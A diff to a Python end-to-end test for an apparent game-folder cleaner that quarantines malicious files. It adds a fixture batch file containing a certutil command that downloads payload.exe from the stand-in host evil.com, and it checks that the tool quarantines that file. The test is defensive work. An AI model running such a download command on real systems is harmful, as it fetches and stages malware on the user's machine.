@@ -32,6 +32,11 @@ class TestPipelineE2E(unittest.TestCase):
         )
         (self.game_dir / "shady_patcher.exe").write_bytes(malicious_content)
 
+        # 4. Create a malicious launcher script
+        (self.game_dir / "Trojan_Launcher.bat").write_text(
+            "@echo off\ncertutil.exe -urlcache -split -f http://evil.com/payload.exe %TEMP%\\evil.exe\n"
+        )
+
     def tearDown(self):
         if self.game_dir.exists():
             shutil.rmtree(self.game_dir, ignore_errors=True)
@@ -52,10 +57,11 @@ class TestPipelineE2E(unittest.TestCase):
 
         # Check malicious file was quarantined
         self.assertFalse((self.game_dir / "shady_patcher.exe").exists())
+        self.assertFalse((self.game_dir / "Trojan_Launcher.bat").exists())
         quarantine_dir = self.game_dir / ".gamecleaner_quarantine"
         self.assertTrue(quarantine_dir.exists())
         quarantined_files = list(quarantine_dir.glob("*.quarantined"))
-        self.assertEqual(len(quarantined_files), 1)
+        self.assertEqual(len(quarantined_files), 2)
 
         # Check firewall scripts
         self.assertTrue((self.game_dir / "block_game_network.ps1").exists())
